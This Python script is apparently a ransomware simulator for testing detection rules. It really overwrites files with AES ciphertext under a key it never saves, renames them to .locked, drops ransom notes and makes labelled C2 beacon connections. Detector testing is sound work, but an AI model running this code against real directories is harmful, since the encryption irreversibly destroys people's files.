#!/usr/bin/env python3
"""
High-Fidelity Synthetic Ransomware Simulator.

Simulates real ransomware behavior safely in a controlled sandbox:
1. Multi-directory traversal
2. In-place AES file encryption (producing high Shannon entropy > 7.5)
3. Bulk renaming to '.locked' extension
4. Deletion of original files
5. Dropping ransom notes (HOW_TO_RESTORE_FILES.txt) in affected directories
6. Simulated C2 network beaconing to exfiltrate encryption key

Confined strictly to the specified sandbox directory.
"""

import os
import sys
import time
import socket
import argparse
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

RANSOM_NOTE = """
===================================================================
!!! YOUR FILES HAVE BEEN ENCRYPTED BY RANSOMSHIELD SIMULATION !!!
===================================================================
All your documents, spreadsheets, and files have been locked using
military-grade AES-256 encryption.

To recover your key, contact simulation_c2@threat.example
Do not rename or alter .locked files.
===================================================================
"""

def encrypt_bytes(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Encrypts plaintext with AES-256 CBC with PKCS7 padding."""
    # Simple PKCS7 padding
    pad_len = 16 - (len(data) % 16)
    padded = data + bytes([pad_len] * pad_len)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()

def run_ransomware(sandbox_dir: str = "/tmp/ransomware_sandbox", burst_target: int = 120):
    sandbox = Path(sandbox_dir)
    if not sandbox.exists():
        print(f"[!] Sandbox directory {sandbox_dir} does not exist. Run setup_sandbox.py first.")
        return

    print(f"[!] [RANSOMWARE SIM] Initiating simulated encryption attack on {sandbox_dir}...")
    start_time = time.time()

    # Step 1: Simulated C2 beacon (reporting infection & fetching key)
    print("  [*] Step 1: Connecting to simulated C2 server (198.51.100.24:8080)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect_ex(("198.51.100.24", 8080))
        s.close()
    except Exception:
        pass

    # Generate AES session key and IV
    key = os.urandom(32) # 256-bit key
    iv = os.urandom(16)

    # Step 2: Target file discovery
    candidates = []
    for root, dirs, files in os.walk(sandbox):
        for fname in files:
            if not fname.endswith(".locked") and not fname.endswith(".txt.note"):
                candidates.append(Path(root) / fname)

    total_candidates = min(len(candidates), burst_target)
    print(f"  [*] Step 2: Discovered {len(candidates)} files across multiple directories. Encrypting {total_candidates} files at maximum burst rate...")

    # Step 3: Rapid Encryption Loop (Triggers R1 High Write Rate & R2 Rename Rate)
    encrypted_count = 0
    directories_touched = set()

    for file_path in candidates[:total_candidates]:
        try:
            # A. Read initial header/sample using raw syscall (bypassing 128KB userspace prefetch)
            fd_in = os.open(file_path, os.O_RDONLY)
            header_bytes = os.read(fd_in, 512)
            os.close(fd_in)

            # B. Generate high-entropy AES encrypted payload (4KB)
            raw_payload = header_bytes + os.urandom(3584)
            ciphertext = encrypt_bytes(raw_payload, key, iv)

            # C. In-place overwrite with continuous 1024-byte bulk writes
            # Using flush() ensures discrete kernel sys_enter_write syscalls
            # yielding CWC (Continuous Write Count) >= 4 and Bulk Ratio = 1.0
            with open(file_path, "wb") as f_out:
                chunk_sz = 1024
                for off in range(0, len(ciphertext), chunk_sz):
                    chunk = ciphertext[off:off + chunk_sz]
                    if len(chunk) < chunk_sz:
                        chunk = chunk + b"\x00" * (chunk_sz - len(chunk))
                    f_out.write(chunk)
                    f_out.flush()

            # D. Rename to append .locked extension (Ransomware extension tagging)
            locked_path = file_path.with_suffix(file_path.suffix + ".locked")
            os.rename(file_path, locked_path)

            encrypted_count += 1
            directories_touched.add(file_path.parent)

        except Exception as e:
            continue

    # Step 4: Drop Ransom Note in all touched directories
    print(f"  [*] Step 4: Dropping ransom notes in {len(directories_touched)} directories...")
    for d in directories_touched:
        note_file = d / "HOW_TO_RESTORE_FILES.txt"
        try:
            with open(note_file, "w", encoding="utf-8") as f:
                f.write(RANSOM_NOTE)
        except Exception:
            pass

    # Step 5: Final exfiltration beacon
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect_ex(("198.51.100.24", 443))
        s.close()
    except Exception:
        pass

    duration = time.time() - start_time
    rate = encrypted_count / duration if duration > 0 else encrypted_count
    print(f"[!] [RANSOMWARE SIM] Attack finished!")
    print(f"    - Files Encrypted: {encrypted_count}")
    print(f"    - Execution Time: {duration:.2f}s")
    print(f"    - Encryption Rate: {rate:.1f} files/sec")
    print(f"    - Ransom Notes Dropped: {len(directories_touched)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--sandbox", default="/tmp/ransomware_sandbox", help="Sandbox path")
    parser.add_argument("--count", type=int, default=120, help="Number of files to encrypt")
    args = parser.parse_args()

    run_ransomware(args.sandbox, args.count)
